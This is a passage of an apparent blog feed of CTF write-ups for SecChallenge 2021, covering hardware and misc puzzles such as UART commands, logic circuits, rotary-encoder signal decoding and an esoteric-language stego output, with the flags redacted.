-&lt;p&gt;From here I started working with the real data, however on the first render it looked quite a mess. Of course, up until now I only used the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;y&lt;/code&gt; variables, so I figured I would tinker a little bit with the other values. This setup gave me a clear enough diagram, so I could read the flag:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'x'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14700&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'y'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9700&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'tilt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'force'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scatter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'x'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'y'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The acquired flag is:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd21{HIDDEN}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;a href=&quot;/SecChall21&quot;&gt;← Back to SecChallenge21&lt;/a&gt;&lt;/p&gt;</content><author><name>m4rcix</name></author><category term="hardware" /><category term="crypto" /><summary type="html">Description</summary></entry><entry><title type="html">Escape The Chains</title><link href="https://m4rcix.github.io/SecChall21/hardware/escape" rel="alternate" type="text/html" title="Escape The Chains" /><published>2021-03-17T00:00:00+00:00</published><updated>2021-03-17T00:00:00+00:00</updated><id>https://m4rcix.github.io/SecChall21/hardware/escape</id><content type="html" xml:base="https://m4rcix.github.io/SecChall21/hardware/escape">&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;
-
-&lt;p&gt;As you wake up, the first thing you notice is a headache. The second one is that you are in the back of a vehicle you do not remember entering. You hear unfamiliar voices outside. Something about an “important device” and “the apocalypse”. While it sounds fairly interesting, you can’t make out the details.&lt;/p&gt;
-
-&lt;p&gt;Sitting up, you notice something on your legs. No one seems to be around, so You are free to take a closer look. It looks like a fancy cuff. On the device, You notice what appears to be a connector, labeled UART…&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://escape-the-chains.secchallenge.crysys.hu&quot;&gt;https://escape-the-chains.secchallenge.crysys.hu&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Note: If you believe to have successfully connected, but receive no feedback from the device, you might want to ask it to help you.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Author: Wintermute, Csf3r3ncz1&lt;/li&gt;
-  &lt;li&gt;Difficulty: easy&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
-
-&lt;p&gt;When opening the website, we are greeted with what seems like a CLI, and some cables on the top left. From the challenge description it was clear, we had to do some UART stuff, firstly wire the device up. I have done some UART communication before, but if you are unsure what to do, you can always just use google, to search for some &lt;a href=&quot;https://learn.sparkfun.com/tutorials/serial-communication/wiring-and-hardware&quot;&gt;wiring&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;After this I started looking for commands to connect to the device with. I used to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;picocom&lt;/code&gt; but had no luck there. Maybe we can look at stuff? The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command worked, and we see some directories:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin
-dev
-boot
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Alright, let’s look at the contents of bin, that can surely help us:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /bin
-&lt;span class=&quot;nb&quot;&gt;ls
-id
-&lt;/span&gt;ttycon
-lsusb
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Two of them seem interesting, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ttycon&lt;/code&gt; probably used to actually connect to the device, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsusb&lt;/code&gt; which I haven’t seen before, but should do something right?&lt;/p&gt;
-
-&lt;p&gt;Right. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lsusb&lt;/code&gt; listed some useful information which we could use to later give parameters to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ttycon&lt;/code&gt; command after some research. After some researching, I finally managed to connect without recieving random BS (which signals you messed up something with the connection)&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ttycon -baud-rate 115200 -data-bits 8 -stop-bits 1 dev/ttyUSB0
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We get yet another terminal, but this time, we are giving instructions to the handcuffs, not to our trusty &lt;a href=&quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ&quot;&gt;Banana Tau&lt;/a&gt; :). After trying a few random commands that came into mind, one finally does something useful, very useful indeed.&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;help
-available commands: check-updates, factory-reset, help, system-info
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Hmmmmmmmmmmmmmmm. Factory-resetting a handcuff? What could go wrong honestly. Let’s try that. After issuing the command, we are presented with the flag:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd21{HIDDEN}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;a href=&quot;/SecChall21&quot;&gt;← Back to SecChallenge21&lt;/a&gt;&lt;/p&gt;</content><author><name>m4rcix</name></author><category term="hardware" /><category term="secchallenge" /><summary type="html">Description</summary></entry><entry><title type="html">The gates of Valhalla</title><link href="https://m4rcix.github.io/SecChall21/hardware/gates_of_valhalla" rel="alternate" type="text/html" title="The gates of Valhalla" /><published>2021-03-17T00:00:00+00:00</published><updated>2021-03-17T00:00:00+00:00</updated><id>https://m4rcix.github.io/SecChall21/hardware/gates</id><content type="html" xml:base="https://m4rcix.github.io/SecChall21/hardware/gates_of_valhalla">&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;
-
-&lt;p&gt;We’re here! We’re finally here! The gates of Valhalla! What an ancient and robust device! I can’t believe I’ll finally enter Valhalla and join the glorious V8 gang! But how do I open it?&lt;/p&gt;
-
-&lt;p&gt;You’ve arrived at the gates of Valhalla. Unfortunately, the gates are closed. There is a control board with a bunch of switches next to the door, and a plaque above saying Only the worthy shall enter the gates of Valhalla. There is a circuit engraved on the plaque. We’ve attached it as a picture to this challenge. Can you open the gates of Valhalla?&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Author: Csf3r3ncz1&lt;/li&gt;
-  &lt;li&gt;Difficulty: medium&lt;/li&gt;
-  &lt;li&gt;Attachment: &lt;a href=&quot;/media/SecChall21/Hardware/Valhalla/Gates_of_Valhalla.png&quot;&gt;Gates_of_Valhalla.png&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
-
-&lt;p&gt;We were given the image linked above, and that’s all. But that’s all what I needed. It was pretty clear what we needed, find the input (probably the flag) which gave 1 as the output. I opened the image in Photoshop, zoomed in, put on my favourite megamix from youtube, and started working. It helped me in the beginning to enter the known digits below. (You know the flag is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd21{.*}&lt;/code&gt; so the first five letters are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd21{&lt;/code&gt; in binary, and the last is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;}&lt;/code&gt; in binary).&lt;/p&gt;
-
-&lt;p&gt;After about an hour of work, I was presented with the flag, almost audible in Pepe’s voice:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd21{HIDDEN}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;a href=&quot;/SecChall21&quot;&gt;← Back to SecChallenge21&lt;/a&gt;&lt;/p&gt;</content><author><name>m4rcix</name></author><category term="hardware" /><category term="secchallenge" /><summary type="html">Description</summary></entry><entry><title type="html">A safe place</title><link href="https://m4rcix.github.io/SecChall21/hardware/safe" rel="alternate" type="text/html" title="A safe place" /><published>2021-03-17T00:00:00+00:00</published><updated>2021-03-17T00:00:00+00:00</updated><id>https://m4rcix.github.io/SecChall21/hardware/safe</id><content type="html" xml:base="https://m4rcix.github.io/SecChall21/hardware/safe">&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;
-
-&lt;p&gt;V8? What did they mean by leaving V8 behind on the ACME servers? Perhaps the war boys deleted the manual? They must have a copy of it! Wait a minute… I remember that Joe has a little home made safe in his room. Maybe its in there?&lt;/p&gt;
-
-&lt;p&gt;You examine the safe, and there is a display on the front, a dial and two buttons. It feels like that the whole thing is made out of scrap electronics. The dial rotates like a rotary encoder, and the thing beeps as you press the buttons. You managed to take the cover off the dial and the next button. Bingo! You can see the rotary encoder and the button’s connectors. You hook up your trusty logic analyzer, and wait for Joe to unlock it. After a few hours, you managed to log the signals while the safe has been opened, but it looks like the encoder is not the best quality.&lt;/p&gt;
-
-&lt;p&gt;Your task is to figure out the code and open the safe. The counter starts from 0. After you figure out the code, you can use the webpage to enter it on the safe, and receive the flag.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://a-safe-place.secchallenge.crysys.hu&quot;&gt;https://a-safe-place.secchallenge.crysys.hu&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;The webpage shall be only used for code verification and flag retrieval. Please do not try to brute force the code via the webpage, you’ll not succeed.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Author: Csf3r3ncz1&lt;/li&gt;
-  &lt;li&gt;Difficulty: medium&lt;/li&gt;
-  &lt;li&gt;Attachment: &lt;a href=&quot;/media/SecChall21/Hardware/Safe/safe_challenge.sal&quot;&gt;safe_challenge.sal&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Looking at other challenges already, I knew a program to open &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.sal&lt;/code&gt; files with, called &lt;a href=&quot;https://discuss.saleae.com/&quot;&gt;Salae Logic 2&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;The challenge said something about &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rotary encoder&lt;/code&gt; so I googled and found &lt;a href=&quot;https://en.wikipedia.org/wiki/Rotary_encoder&quot;&gt;this&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;I opened the given file with Salae Logic 2, and started looking at the signals. Some few key points from the linked wiki page, which helped me understand and solve the challenge easily.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;If A is followed by B rotation is positive&lt;/li&gt;
-  &lt;li&gt;If B is followed by A rotation is negative&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;I almost started coding when I realized two things:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;The signals are noisy, which would make it problemmatic to detect by script&lt;/li&gt;
-  &lt;li&gt;There aren’t that many rotations that I cannot solve this by hand&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;So I started working. When you launch the site, it starts from 0, so that’s where I started, counting the rotations tirelessly. After a bit, I had the combination at hand. (Which I won’t share, since it would be a freebie after that)&lt;/p&gt;
-
-&lt;p&gt;The acquired flag is:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd21{HIDDEN}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;a href=&quot;/SecChall21&quot;&gt;← Back to SecChallenge21&lt;/a&gt;&lt;/p&gt;</content><author><name>m4rcix</name></author><summary type="html">Description</summary></entry><entry><title type="html">I use arch btw</title><link href="https://m4rcix.github.io/SecChall21/misc/iusearchbtw" rel="alternate" type="text/html" title="I use arch btw" /><published>2021-03-17T00:00:00+00:00</published><updated>2021-03-17T00:00:00+00:00</updated><id>https://m4rcix.github.io/SecChall21/misc/iusearchbtw</id><content type="html" xml:base="https://m4rcix.github.io/SecChall21/misc/iusearchbtw">&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;
-
-&lt;p&gt;“If you don’t fight with your OS for at least 2 hours a day for basic functionality, you’re not a real man.” ~Sun Tzu&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Author: chronos&lt;/li&gt;
-  &lt;li&gt;Difficulty: easy&lt;/li&gt;
-  &lt;li&gt;Attachment: &lt;a href=&quot;/media/SecChall21/Misc/Iusearch/i_use_arch_btw.png&quot;&gt;i_use_arch_btw.png&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
-
-&lt;p&gt;Since this looked like a stego challenge, I started working my usual stego toolkit. The first tool that got me something was &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsteg&lt;/code&gt;. It printed something that looked terrifying:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;i the linux way i the linux way use i arch arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch arch arch i way use arch btw i arch arch arch arch arch the linux use arch arch arch arch arch arch i way use btw arch arch arch arch arch arch arch arch arch arch arch arch arch btw i arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux linux linux linux linux i way use btw i arch arch arch arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch arch arch i way use arch btw linux linux linux linux linux linux linux linux linux linux btw arch arch arch arch arch arch btw i arch arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux linux linux linux i way use linux btw i arch arch arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch arch i way use arch btw arch arch arch arch arch arch arch arch arch arch arch arch arch arch btw i arch arch arch arch the linux use linux linux linux linux i way use btw arch arch arch arch arch arch arch arch arch arch arch arch arch arch btw btw i arch arch arch arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux i way use linux linux btw i arch arch arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch arch arch arch i way use arch arch arch btw i arch arch arch the linux use linux linux linux linux linux i way use btw linux linux linux linux linux linux linux btw i arch arch arch the linux use arch arch arch arch arch arch i way use arch btw i arch arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux linux linux linux i way use btw i arch arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch arch arch arch arch i way use arch btw arch btw linux linux linux linux linux linux linux linux linux linux linux btw arch arch arch arch arch arch arch arch arch arch arch arch arch btw i arch arch arch arch the linux use linux linux linux linux i way use linux btw i arch arch arch the linux use arch arch arch arch arch arch i way use arch btw linux linux linux linux linux linux linux linux linux linux linux btw arch arch arch arch arch btw linux linux linux linux linux linux linux btw i arch arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux linux i way use linux btw i arch arch arch arch arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch i way use arch arch btw arch arch arch arch arch arch btw linux linux linux linux linux linux btw arch btw i arch arch arch the linux use linux linux linux linux linux i way use btw arch arch arch arch arch arch arch arch btw i arch arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux linux linux i way use btw i arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch i way use arch btw i arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux i way use linux btw i arch arch arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch arch arch arch i way use arch btw linux linux btw linux linux linux linux linux linux linux linux linux linux linux linux linux linux btw i arch arch arch arch arch arch the linux use linux linux linux linux linux linux i way use linux linux btw i arch arch arch arch arch the linux use linux linux linux linux linux linux i way use linux btw i arch arch arch arch the linux use arch arch arch arch arch arch arch arch i way use arch arch btw i arch arch arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch i way use arch arch btw i arch arch arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux linux linux linux linux linux i way use linux linux btw i arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch arch arch i way use btw i arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch i way use btw arch arch arch arch arch arch arch arch arch arch arch btw linux linux btw i arch arch arch the linux use linux linux linux linux linux linux linux i way use linux btw i arch arch arch arch the linux use arch arch arch arch arch arch i way use btw i arch arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux linux linux i way use btw linux linux linux linux linux linux linux linux linux linux linux linux btw i arch arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch arch arch i way use arch btw arch arch arch arch arch arch arch arch arch arch arch arch btw linux btw linux linux linux linux linux linux linux btw arch arch arch arch arch arch arch arch arch arch arch btw i arch arch arch arch the linux use linux linux linux linux i way use linux btw i arch arch arch the linux use arch arch arch arch arch arch i way use arch btw linux btw i arch arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux linux i way use linux btw linux linux linux linux linux linux linux linux linux linux linux linux btw i arch arch arch arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch i way use btw linux linux linux btw arch arch arch arch arch arch arch arch arch arch arch arch arch btw linux linux linux linux linux linux linux linux linux linux linux linux linux btw i arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux linux linux i way use linux linux linux btw i arch arch arch arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch i way use arch btw arch arch arch arch arch arch arch arch arch arch btw i arch arch arch arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux i way use linux linux btw i arch arch arch arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch arch arch i way use arch btw linux linux linux linux linux linux linux linux linux linux btw arch arch arch arch arch arch btw linux linux linux btw i arch arch arch arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux i way use linux btw i arch arch arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch arch i way use btw arch arch arch arch arch arch btw linux linux linux linux linux linux linux linux linux linux linux btw arch arch arch arch arch arch btw i arch arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux linux i way use linux btw i arch arch arch arch arch the linux use arch arch arch arch arch i way use arch btw i arch arch arch arch the linux use linux linux linux linux i way use linux btw i arch arch arch arch arch the linux use linux linux linux linux linux linux i way use linux btw i arch arch arch arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch arch arch i way use arch btw arch btw i arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux linux i way use btw linux btw i arch arch arch arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch i way use arch arch btw i arch arch arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux i way use linux linux btw i arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch i way use arch btw i arch arch arch the linux use arch arch arch arch arch arch arch i way use arch btw i arch arch arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux i way use btw linux linux btw i arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch arch arch i way use btw arch arch arch arch arch arch arch arch arch arch arch arch arch arch btw i arch arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux i way use linux btw i arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch i way use arch arch btw i arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux linux i way use linux btw arch arch arch arch arch btw i arch arch arch arch arch arch the linux use arch arch arch arch arch arch arch i way use btw i arch arch arch arch the linux use arch arch arch arch arch arch i way use btw i arch arch arch the linux use linux linux linux linux linux i way use btw i arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux linux linux linux linux i way use linux btw i arch arch arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch i way use arch arch arch btw i arch arch arch the linux use linux linux linux linux linux i way use btw i arch arch arch the linux use arch arch arch arch arch i way use btw i arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux linux i way use linux linux btw i arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch arch i way use btw i arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux linux i way use btw i arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch arch arch arch arch i way use btw i arch arch arch the linux use arch arch arch arch arch arch arch i way use btw i arch arch arch arch arch the linux use linux linux linux linux linux i way use linux btw i arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux i way use btw linux linux btw btw arch arch btw i arch arch arch arch arch arch arch arch the linux use arch arch arch arch arch arch arch arch arch i way use btw i arch arch arch arch arch arch arch arch the linux use linux linux linux linux linux linux linux linux linux linux linux linux linux linux i way use linux linux linux btw use \n
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Okay, this is obviously a brainfuck language right? Yep. &lt;a href=&quot;https://github.com/OverMighty/i-use-arch-btw&quot;&gt;This&lt;/a&gt; is the first result if you search “I use arch btw” in Google. After compiling the program and giving it the above text as input, you recieve the flag:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd21{HIDDEN}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;a href=&quot;/SecChall21&quot;&gt;← Back to SecChallenge21&lt;/a&gt;&lt;/p&gt;</content><author><name>m4rcix</name></author><summary type="html">Description</summary></entry><entry><title type="html">Little Mix</title><link href="https://m4rcix.github.io/SecChall21/misc/little_mix" rel="alternate" type="text/html" title="Little Mix" /><published>2021-03-17T00:00:00+00:00</published><updated>2021-03-17T00:00:00+00:00</updated><id>https://m4rcix.github.io/SecChall21/misc/littlemix</id><content type="html" xml:base="https://m4rcix.github.io/SecChall21/misc/little_mix">&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;
-
-&lt;p&gt;Just a little mix, but not this one: &lt;a href=&quot;https://www.youtube.com/watch?v=MkElfR_NPBI&quot;&gt;https://www.youtube.com/watch?v=MkElfR_NPBI&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc challenges.crysys.hu 5029&lt;/code&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Author: tk&lt;/li&gt;
-  &lt;li&gt;Difficulty: medium&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
-
-&lt;p&gt;This challenge was a mini-quiz, with some “trivia” questions from all six categories present in the SecChallenge. Most of them are simple questions e.g. basic XOR in the crypto section. All you have to do here, is answer all 18 questions, and you get the flag. That simple. The only part I struggled with initially, was where you had to reverse a ‘basic’ x86 code. But after doing some research on x86 Opcodes, I was able to solve it even by hand, on paper (!). If you want the easy way out, just click &lt;a href=&quot;https://www.google.com/&quot;&gt;this&lt;/a&gt; :)&lt;/p&gt;
-
-&lt;p&gt;The acquired flag is:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd21{HIDDEN}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;a href=&quot;/SecChall21&quot;&gt;← Back to SecChallenge21&lt;/a&gt;&lt;/p&gt;</content><author><name>m4rcix</name></author><category term="misc" /><category term="secchallenge" /><summary type="html">Description</summary></entry><entry><title type="html">TBD</title><link href="https://m4rcix.github.io/SecChall21/misc/TBD" rel="alternate" type="text/html" title="TBD" /><published>2021-03-17T00:00:00+00:00</published><updated>2021-03-17T00:00:00+00:00</updated><id>https://m4rcix.github.io/SecChall21/misc/tbd</id><content type="html" xml:base="https://m4rcix.github.io/SecChall21/misc/TBD">&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;
-
-&lt;p&gt;TBD&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;Note: You should be able to mount the file system and view every file without running into corrupted files. If you encounter corrupted files, it is probably because the filesystem was not correctly mounted/unpacked.&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;Also note: For this challenge, you’ll have only 100 attempt to find the flag, so don’t guess too much!&lt;/em&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Author: kapi&lt;/li&gt;
-  &lt;li&gt;Difficulty: hard&lt;/li&gt;
-  &lt;li&gt;Attachment: &lt;a href=&quot;/media/SecChall21/Misc/TDB/finalfinalversionforrealthistime&quot;&gt;finalfinalversionforrealthistime&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
-
-&lt;p&gt;Getting a random file, first thing to do is basic recon, run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exiftool&lt;/code&gt; etc. on it, see what comes up.&lt;/p&gt;
